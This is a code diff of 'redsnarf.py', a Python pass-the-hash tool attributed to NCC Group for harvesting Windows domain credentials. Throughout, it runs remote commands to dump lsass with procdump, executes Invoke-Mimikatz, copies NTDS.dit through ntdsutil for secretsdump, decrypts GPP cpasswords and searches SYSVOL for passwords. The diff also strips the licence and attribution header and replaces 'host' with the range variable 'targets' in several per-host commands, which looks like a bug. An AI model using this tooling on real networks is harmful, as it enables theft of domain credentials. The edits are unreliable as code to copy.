@@ -1,7 +1,4 @@
 #! /usr/bin/python
-# Released as open source by NCC Group Plc - https://www.nccgroup.trust/uk/
-# https://github.com/nccgroup/redsnarf
-# Released under Apache V2 see LICENCE for more information
 
 import os, argparse, signal, sys, re, binascii, subprocess
 
@@ -22,6 +19,8 @@ from base64 import b64decode
 from socket import *
 from threading import Thread
 
+from impacket.smbconnection import *
+
 yesanswers = ["yes", "y", "Y", "Yes", "YES"]
 noanswers = ["no", "NO", "n", "N"]
 events_logs = ["application","security","setup","system"]
@@ -34,6 +33,7 @@ def banner():
  |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
  |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
         \/     \/     \/       \/     \/     \/                      
+
 """
 	print colored("\nE D Williams - NCCGroup",'red')
 	print colored("R Davy - NCCGroup\n",'red')
@@ -48,7 +48,7 @@ def gppdecrypt(cpassword_pass):
 	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
 	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')
 
-def datadump(user, passw, host, path):
+def datadump(user, passw, host, path, os_version):
 	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
 	signal_number = (return_value & 0x0F)
 	if not signal_number:
@@ -69,7 +69,7 @@ def datadump(user, passw, host, path):
 			for f in files:
 				try:
 					print colored("[+]getting: "+f,'yellow')
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
 				except OSError:
 					print colored("[-]Something went wrong here getting files via smbclient("+f+"): "+host,'red')
 			try:
@@ -86,14 +86,10 @@ def datadump(user, passw, host, path):
 			if skiplsacache in noanswers:
 				try:
 					print colored("[+]getting remote version: "+host,'green')
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C systeminfo > c:\\os_version.txt\" 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+'/tmp/'+"; get os_version.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\\os_version.txt\" 2>/dev/null")
-					if os.path.isfile('/tmp/'+"/os_version.txt"):
-						print colored("[+]os_version.txt file found",'green')
-						if 'Server 2003' in open('/tmp/os_version.txt').read():
-							print colored("[+]Server 2003 Found..oh dear",'blue')
-							os.system("rm /tmp/os_version.txt")
+					print os_version
+					if os_version!='':												
+						if os_version.find('Server 2003')!=-1:
+							print colored("[+]Server 2003 Found..oh dear",'blue')							
 							for p in progs:
 								try:
 									print colored("[+]Using "+p+": "+host ,'green')
@@ -104,7 +100,6 @@ def datadump(user, passw, host, path):
 								if os.stat(path+host+"/cachedump").st_size == 0:
 									print colored("[-]No cached creds for: "+host,'yellow')
 						else:
-							os.system("rm /tmp/os_version.txt")
 							for p in progs:
 								try:
 									print colored("[+]Using "+p+": "+host ,'green')
@@ -115,14 +110,14 @@ def datadump(user, passw, host, path):
 								if os.stat(path+host+"/cachedump").st_size == 0:
 									print colored("[-]No cached creds for: "+host,'yellow')
 					else:
-						print colored("[-]os_version.txt file not found",'red')        
+						print colored("[-]os version not found",'red')        
 				except OSError:
-					print colored("[-]Something went wrong getting os_version.txt",'red')
+					print colored("[-]Something went wrong getting os version",'red')
 
 			if service_accounts in yesanswers:
 				print colored("[+]Checking for services running as users: "+host,'yellow')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\users.txt\" 2>/dev/null")
-				os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
+				os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
 				res = os.stat(path+host+"/users.txt").st_size > 3
 				if res==True:
@@ -145,11 +140,11 @@ def datadump(user, passw, host, path):
 					print colored("[+]Procdump.exe found",'green')
 				try:
 					print colored("[+]getting dump of lsass: "+host,'green')
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
-					if os.path.isfile(outputpath+host+"/lsass.dmp"):
+					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
+					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; get lsass.dmp\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
+					if os.path.isfile(outputpath+targets+"/lsass.dmp"):
 						print colored("[+]lsass.dmp file found",'green')
 					else:
 						print colored("[-]lsass.dmp file not found",'red')        
@@ -164,27 +159,28 @@ def datadump(user, passw, host, path):
 					fout.write('Invoke-Mimikatz -DumpCreds > c:\\mimi_creddump.txt\n')
 					fout.write('exit\n')
 					fout.close() 
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /usr/share/nishang/Gather; put Invoke-Mimikatz.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
-					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
+					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /usr/share/nishang/Gather; put Invoke-Mimikatz.ps1\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; get mimi_creddump.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
+					if os.path.isfile(outputpath+targets+"/mimi_creddump.txt"):
 						print colored("[+]mimi_creddump.txt file found",'green')
 						if not os.path.isfile('/usr/bin/dos2unix'):
 							print colored("[-]Cannot find dos2unix",'red')
 							exit(1)				
 						else:
 							print colored("[+]Found dos2unix",'green')
-							os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
-							print colored("[+] Mimikatz output stored in "+outputpath+host+"/mimi_creddump.txt",'yellow')
+							os.system("dos2unix "+outputpath+targets+"/mimi_creddump.txt 2>/dev/null")
+							print colored("[+] Mimikatz output stored in "+outputpath+targets+"/mimi_creddump.txt",'yellow')
 							print colored("[+] Basic parsed output:",'green')
-							os.system("cat "+outputpath+host+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
+							os.system("cat "+outputpath+targets+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 					else:
 						print colored("[-]mimi_creddump.txt file not found",'red')       
 				except OSError:
 					print colored("[-]Something went wrong running Mimikatz...",'red')
 
+			
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
 		sys.exit()
@@ -214,16 +210,35 @@ def syschecks():
 
 def run():
 	for target in IPNetwork(targets):
+
 		host=str(target)
-		s = socket (AF_INET, SOCK_STREAM)
-		s.settimeout(10)
-		result = s.connect_ex ((host, 445))
-		if result == 0:
-			print colored("[+]"+host+" responding to 445",'green')
-			t = Thread(target=datadump, args=(user,passw,host,outputpath))
-			t.start()
-			t.join()
+		
+		passwd=''
+
+		if passw[len(passw)-3:] ==':::':
+			lmhash, nthash ,s1,s2,s3 = passw.split(':')
 		else:
+			lmhash = ''
+			nthash = ''
+
+		if nthash=='':
+			passwd=passw	
+
+		try: 
+
+			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10) 
+
+			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
+			
+			if x==None or x==True:
+				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession() ==0:
+					print colored("[+]"+host+" responding to 445",'green')
+					t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
+					t.start()
+					t.join()
+				else:
+					print colored("[-]"+host+" not responding on port 445",'red')
+		except:
 			print colored("[-]"+host+" not responding on port 445",'red')
 
 def main():
@@ -296,7 +311,7 @@ def main():
 		print colored ('\n[+] Check out '+mergepf+' for unique, sorted, merged hash list','yellow')
 
 banner()
-p = argparse.ArgumentParser("Simple example usage: ./%prog -H 192.168.0.1 -u administrator -p Password01", version="%prog 0.1")
+p = argparse.ArgumentParser("Simple example usage: ./%prog -H 192.168.0.1 -u administrator -p Password01", version="%prog 0.2")
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname or range to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="administrator",help="Enter a username")
 p.add_argument("-p", "--password", dest="password", default="Password01", help="Enter a password or hash")
@@ -339,72 +354,80 @@ massmimi_dump=args.massmimi_dump
 service_accounts=args.service_accounts
 
 if drsuapi in yesanswers:
-	try:
-		if not os.path.isfile('/usr/local/bin/secretsdump.py'):
-			print colored("[-]No secretsdump.py",'red')
-			print colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow')
-			print colored("[-]and run: python setup.py install",'yellow')
-			exit(1)				
-		else:
-			print colored("[+]Found secretsdump",'green')
-		if not os.path.isdir(outputpath+targets):
-			os.makedirs(outputpath+targets)
-			print colored("[+]Creating directory for host: "+outputpath+targets,'green')
-		else:
-			print colored("[+]Found directory for: "+outputpath+targets,'green')
-		print colored("[+]Saving hashes to: "+outputpath+targets+'/drsuapi_gethashes.txt','yellow')
-		pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
-		pwdump = pwdumpmatch.match(passw)
-		if pwdump:
-			os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets +'> '+outputpath+targets+'/drsuapi_gethashes.txt')
-		else:
-			os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets +'> '+outputpath+targets+'/drsuapi_gethashes.txt')
-		if os.path.isfile(outputpath+targets+"/drsuapi_gethashes.txt"):
-			print colored("[+]Found file - completed : "+outputpath+targets,'green')
-			sys.exit()
-		else:
-			print colored("[-]Something has gone horribly wrong......",'red')
-	except OSError:
-		print colored("[-]Something went wrong using the drsuapi method",'red')
+	if targets.find('/')==-1:
+		try:
+			if not os.path.isfile('/usr/local/bin/secretsdump.py'):
+				print colored("[-]No secretsdump.py",'red')
+				print colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow')
+				print colored("[-]and run: python setup.py install",'yellow')
+				exit(1)				
+			else:
+				print colored("[+]Found secretsdump",'green')
+			if not os.path.isdir(outputpath+targets):
+				os.makedirs(outputpath+targets)
+				print colored("[+]Creating directory for host: "+outputpath+targets,'green')
+			else:
+				print colored("[+]Found directory for: "+outputpath+targets,'green')
+			print colored("[+]Saving hashes to: "+outputpath+targets+'/drsuapi_gethashes.txt','yellow')
+			pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
+			pwdump = pwdumpmatch.match(passw)
+			if pwdump:
+				os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets +'> '+outputpath+targets+'/drsuapi_gethashes.txt')
+			else:
+				os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets +'> '+outputpath+targets+'/drsuapi_gethashes.txt')
+			if os.path.isfile(outputpath+targets+"/drsuapi_gethashes.txt"):
+				print colored("[+]Found file - completed : "+outputpath+targets,'green')
+				sys.exit()
+			else:
+				print colored("[-]Something has gone horribly wrong......",'red')
+		except OSError:
+			print colored("[-]Something went wrong using the drsuapi method",'red')
+	else:
+		print colored ('\n[-] It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
 
 if ntds_util in yesanswers:
-	try:
-		if not os.path.isdir(outputpath+targets):
-			os.makedirs(outputpath+targets)
-			print colored("[+]Creating directory for host: "+outputpath+targets,'green')
-		else:
-			print colored("[+]Found directory for : "+outputpath+targets,'green')
-		print colored("[+]Attempting to grab a copy of NTDS.dit using NTDSUtil",'green')
-		pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
-		fout=open('/tmp/ntds.bat','w')
-		fout.write('@echo off\n')
-		fout.write(pscommand)
-		fout.close() 
-		os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
-		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C c:\\ntds.bat\" < /dev/null")
-		os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget registry; exit'")
-		os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit'")
-		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C rd /s /q c:\\redsnarf\"")
-		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C del c:\\ntds.bat\"") 
-		if os.path.isfile(outputpath+targets+'/registry/SYSTEM') and os.path.isfile(outputpath+targets+'/Active Directory/ntds.dit'):	
-			print colored("[+]Found SYSTEM and ntds.dit",'green')
-			print colored("[+]Extracting Hash Database to "+outputpath+targets+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')
-			os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+outputpath+targets+'/system '+ "-ntds "+outputpath+targets+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets+"/hashdump.txt local")
-			if os.path.isfile(outputpath+targets+'/hashdump.txt'):
-				print colored("[+]Hashes successfully output to "+outputpath+targets+'/hashdump.txt','green')
+	if targets.find('/')==-1:
+		try:
+			if not os.path.isdir(outputpath+targets):
+				os.makedirs(outputpath+targets)
+				print colored("[+]Creating directory for host: "+outputpath+targets,'green')
 			else:
-				print colored("[-]Somthing went wrong extracting hashes','red'")	
-			print colored("[+]Gathering hash history...",'yellow')	
-			os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -history -system "+outputpath+targets+'/system '+ "-ntds "+outputpath+targets+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets+"/hashhistoryhashdump.txt local")
-			if os.path.isfile(outputpath+targets+'/hashhistorydump.txt'):
-				print colored("[+]Hashes successfully output to "+outputpath+targets+'/hashhistorydump.txt','green')
+				print colored("[+]Found directory for : "+outputpath+targets,'green')
+			print colored("[+]Attempting to grab a copy of NTDS.dit using NTDSUtil",'green')
+			pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
+			fout=open('/tmp/ntds.bat','w')
+			fout.write('@echo off\n')
+			fout.write(pscommand)
+			fout.close() 
+			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C c:\\ntds.bat\" < /dev/null")
+			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget registry; exit'")
+			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit'")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C rd /s /q c:\\redsnarf\"")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C del c:\\ntds.bat\"") 
+			if os.path.isfile(outputpath+targets+'/registry/SYSTEM') and os.path.isfile(outputpath+targets+'/Active Directory/ntds.dit'):	
+				print colored("[+]Found SYSTEM and ntds.dit",'green')
+				print colored("[+]Extracting Hash Database to "+outputpath+targets+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')
+				os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -system "+outputpath+targets+'/registry/SYSTEM '+ "-ntds "+outputpath+targets+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets+"/hashdump.txt local")
+				if os.path.isfile(outputpath+targets+'/hashdump.txt.ntds'):
+					print colored("[+]Hashes successfully output to "+outputpath+targets+'/hashdump.txt.ntds','green')
+				else:
+					print colored("[-]Somthing went wrong extracting hashes','red'")	
+				print colored("[+]Gathering hash history...",'yellow')	
+				os.system("/usr/local/bin/secretsdump.py -just-dc-ntlm -history -system "+outputpath+targets+'/registry/SYSTEM '+ "-ntds "+outputpath+targets+"/Active\ Directory/ntds.dit" +" -outputfile "+outputpath+targets+"/hashhistoryhashdump.txt local")
+				if os.path.isfile(outputpath+targets+'/hashhistoryhashdump.txt.ntds'):
+					print colored("[+]Hashes successfully output to "+outputpath+targets+'/hashhistorydump.txt.ntds','green')
+				else:
+					print colored("[-]Somthing went wrong extracting hash history','red'")	
 			else:
-				print colored("[-]Somthing went wrong extracting hash history','red'")	
-		else:
-			print colored("[-]missing SYSTEM and ntds.dit",'red')
-		sys.exit()		
-	except OSError:
-		print colored("[-]Something went wrong dumping NTDS.dit",'red')
+				print colored("[-]missing SYSTEM and ntds.dit",'red')
+			sys.exit()		
+		except OSError:
+			print colored("[-]Something went wrong dumping NTDS.dit",'red')
+	else:
+		print colored ('\n[-] It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
 
 if c_password!='':
 	try:
@@ -416,35 +439,39 @@ if c_password!='':
 		sys.exit()
 
 if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
-	if user!='' and passw!='' and targets!='':
-		print colored("[+]Attempting to download contents of Policies and scripts from sysvol and search for administrator and password:",'yellow')
+	if targets.find('/')==-1:
+		if user!='' and passw!='' and targets!='':
+			print colored("[+]Attempting to download contents of Policies and scripts from sysvol and search for administrator and password:",'yellow')
 
-		if not os.path.isdir(outputpath+targets):
-			os.makedirs(outputpath+targets)
-			print colored("[+]Creating directory for host: "+outputpath+targets,'green')
+			if not os.path.isdir(outputpath+targets):
+				os.makedirs(outputpath+targets)
+				print colored("[+]Creating directory for host: "+outputpath+targets,'green')
+			else:
+				print colored("[+]Found directory for : "+outputpath+targets,'green')
+			if os.path.isdir(outputpath+targets):
+				print colored("[+]Attempting to download policies folder from /sysvol",'green')		
+				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit'")
+				print colored("[+]Attempting to download scripts folder from /sysvol",'green')	
+				os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit'")
+				if os.path.isdir(outputpath+targets+'/scripts/'):
+					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets+'/scripts/','green')	
+					os.chdir(outputpath+targets+'/scripts/')
+					os.system("pwd")
+					os.system("grep --color='auto' -ri administrator")
+					os.system("grep --color='auto' -ri password")
+				if os.path.isdir(outputpath+targets+'/Policies/'):
+					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets+'/Policies/','green')	
+					os.chdir(outputpath+targets+'/Policies/')
+					os.system("pwd")
+					os.system("grep --color='auto' -ri administrator")
+					os.system("grep --color='auto' -ri password")
+				sys.exit()
 		else:
-			print colored("[+]Found directory for : "+outputpath+targets,'green')
-		if os.path.isdir(outputpath+targets):
-			print colored("[+]Attempting to download policies folder from /sysvol",'green')		
-			os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit'")
-			print colored("[+]Attempting to download scripts folder from /sysvol",'green')	
-			os.system("/usr/bin/pth-smbclient //"+targets+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit'")
-			if os.path.isdir(outputpath+targets+'/scripts/'):
-				print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets+'/scripts/','green')	
-				os.chdir(outputpath+targets+'/scripts/')
-				os.system("pwd")
-				os.system("grep --color='auto' -ri administrator")
-				os.system("grep --color='auto' -ri password")
-			if os.path.isdir(outputpath+targets+'/Policies/'):
-				print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets+'/Policies/','green')	
-				os.chdir(outputpath+targets+'/Policies/')
-				os.system("pwd")
-				os.system("grep --color='auto' -ri administrator")
-				os.system("grep --color='auto' -ri password")
+			print colored ('[-] Something has gone wrong check your parameters!, Try --help for a list of parameters','red')
+			print colored ('[-] Usage - ./redsnarf.py -H 10.0.0.1 -u username -p password -P y -D domain','yellow')
 			sys.exit()
 	else:
-		print colored ('[-] Something has gone wrong check your parameters!, Try --help for a list of parameters','red')
-		print colored ('[-] Usage - ./redsnarf.py -H 10.0.0.1 -u username -p password -P y -D domain','yellow')
+		print colored ('\n[-] It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
 if dropshell in yesanswers:
@@ -467,4 +494,4 @@ syschecks()
 if __name__ == '__main__':
 	signal.signal(signal.SIGINT, signal_handler)
 	main()
-print colored("[+]end",'green')
+	print colored("[+]end",'green')
